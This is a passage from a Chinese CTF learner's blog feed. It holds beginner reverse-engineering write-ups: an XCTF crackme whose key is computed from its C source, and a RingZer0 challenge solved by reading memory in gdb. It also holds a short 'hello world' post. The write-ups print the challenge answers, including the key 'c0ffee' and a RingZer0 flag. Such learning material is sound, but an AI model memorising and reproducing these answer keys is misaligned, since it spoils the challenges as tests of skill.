class="line">    	<span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Brr wrrr grr\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Get your key: "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="然后"><a href="#然后" class="headerlink" title="然后"></a>然后</h2><p>很明显这段代码是计算flag的，根据argv的三个数据进行运算</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br></pre></td></tr></table></figure>

<h3 id="第一个"><a href="#第一个" class="headerlink" title="第一个"></a>第一个</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"you are wrong, sorry.\n"</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>first = 0xcafe; 因为不等于就退出了。</p>
<h3 id="第二个"><a href="#第二个" class="headerlink" title="第二个"></a>第二个</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"ha, you won't get it!\n"</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果条件满足程序就退出了，所以我们需要知道这给数值是多少</p>
<p>所以写一段代码算一下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">50</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (i % <span class="number">5</span> != <span class="number">3</span> &amp;&amp; i % <span class="number">17</span> == <span class="number">8</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<blockquote>
<p>25</p>
<p>42</p>
</blockquote>
<p>second = 25；测试后是25</p>
<h3 id="第三个"><a href="#第三个" class="headerlink" title="第三个"></a>第三个</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">"h4cky0u"</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"so close, dude!\n"</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>strcmp函数，如果两个数值相等则返回0，退出if条件。</p>
<p>argv[3]=“h4cky0u”</p>
<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>根据刚刚的结果测试一下，附测试代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> first = <span class="number">0xcafe</span>;</span><br><span class="line">    <span class="keyword">int</span> second = <span class="number">25</span>;</span><br><span class="line">    argv[<span class="number">3</span>] = <span class="string">"h4cky0u"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Brr wrrr grr\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Get your key: "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, hash);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"PAUSE"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<blockquote>
<p>Brr wrrr grr<br>Get your key: c0ffee</p>
<p>请按任意键继续. . .</p>
</blockquote>
<h3 id="提交！Flag！"><a href="#提交！Flag！" class="headerlink" title="提交！Flag！"></a>提交！Flag！</h3><p>提交成功！</p>
<blockquote>
<p>flag: c0ffee</p>
</blockquote>
<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h1><p>待续ing</p>
]]></content>
      <categories>
        <category>攻防世界</category>
      </categories>
      <tags>
        <tag>攻防世界</tag>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>RingZer0-Reverse</title>
    <url>/2020/01/03/RingZer0-Reverse/</url>
    <content><![CDATA[<center>君子终日乾乾，夕惕若，厉无咎。</center>

<p><img src="https://i.loli.net/2020/02/09/4nt7wMxSp6mlBH9.png" alt="origindal.png"></p>
<a id="more"></a>

<p>这篇文章记录了RingZer0-Reverse破解记录。</p>
<p>小白上路，望指教。</p>
<h1 id="Can-you-see-through-the-star"><a href="#Can-you-see-through-the-star" class="headerlink" title="Can you see through the star"></a>Can you see through the star</h1><blockquote>
<p>持续更新中。。。</p>
</blockquote>
<h1 id="Time-to-learn-x86-ASM-amp-gdb"><a href="#Time-to-learn-x86-ASM-amp-gdb" class="headerlink" title="Time to learn x86 ASM &amp; gdb"></a>Time to learn x86 ASM &amp; gdb</h1><blockquote>
<p>2020年1月3日</p>
</blockquote>
<h2 id="首先运行一下这个程序"><a href="#首先运行一下这个程序" class="headerlink" title="首先运行一下这个程序"></a>首先运行一下这个程序</h2><p><img src="https://i.loli.net/2019/05/13/5cd98eb7889ad72340.png" alt="01"></p>
<blockquote>
<p>Loading…</p>
<p>where is the flag?</p>
</blockquote>
<p>可以从结果看出来flag可能在程序里面创建了，但没有打印。</p>
<h2 id="使用gdb调试"><a href="#使用gdb调试" class="headerlink" title="使用gdb调试"></a>使用gdb调试</h2><p>用GDB打开这个程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">gdb 程序名称</span></span><br></pre></td></tr></table></figure>

<p>习惯使用intel汇编格式的可以将格式更改为intel格式。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set disassembly-flavor intel</span><br></pre></td></tr></table></figure>

<p>显示出main函数对应的汇编代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">disas main</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/05/14/5cda09b32de6572756.png" alt="02"></p>
<p>反汇编二进制文件，前两个函数叫做malloc和memset。我们可以看到malloc被调用来初始化一个大小为24的数组，然后调用memset用0来初始化数组.</p>
<p>由此可见，很可能在这里创建一个大小为24的字符串。</p>
<p><img src="https://i.loli.net/2019/05/14/5cda19d0da87e97756.png" alt="03.png"></p>
<p>在malloc和memset之后，使用puts 调用字符串“loading…”和“where is the flag？”我们看到这部分仅仅是对字符串的一系列操作</p>
<p>我们尝试一下，获取字符串地址并在程序结束时打印出Flag</p>
<h2 id="获取字符串地址"><a href="#获取字符串地址" class="headerlink" title="获取字符串地址"></a>获取字符串地址</h2><p>在调用malloc之前设置一个断点，然后运行程序并打印eax的值，以获取数组的地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">break *0x080484a5</span><br><span class="line">r</span><br><span class="line">p&#x2F;x $eax</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/05/14/5cda1fbb913c654809.png" alt="04.png"></p>
<p>我们在这里发现数组的地址是<code>0x0804b160</code></p>
<p>我们选择接近程序末尾的地方来设置一个断点，这样我们就可以获得该flag的内容。</p>
<h2 id="拿到flag"><a href="#拿到flag" class="headerlink" title="拿到flag"></a>拿到flag</h2><p>在0x08048544处创建一个断点，继续运行之前停止的程序，查看之前获得的内存地址里的字符串。</p>
<p>然后，到这里我们可以看到flag了。</p>
<p><img src="https://i.loli.net/2019/05/14/5cda221f9cdd670831.png" alt="05.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FLAG-4092849uio2jfklsj4kl</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>RingZer0</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>RingZer0</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello-world</title>
    <url>/2020/01/01/hello-world/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2019/05/14/5cda2d265cd7526615.jpeg" alt="00.jpeg"></p>
<a id="more"></a>

<blockquote>
<p>大方无隅，大器晚成</p>
</blockquote>
<h2 id="博客搭建成功！"><a href="#博客搭建成功！" class="headerlink" title="博客搭建成功！"></a>博客搭建成功！</h2><p>经过了一上午，终于把博客搭建完成了。</p>
<p>从今天开始，记录学习生涯，加油！</p>
<h2 id="内容说明"><a href="#内容说明" class="headerlink" title="内容说明"></a>内容说明</h2><p>偶尔发一些学习经验和一些踩过的坑。</p>
<p>每周发布1-3篇技术或者漏洞复现的文章。</p>
<p>好好学习，天天向上</p>
<p>共勉！</p>
]]></content>
  </entry>
</search>
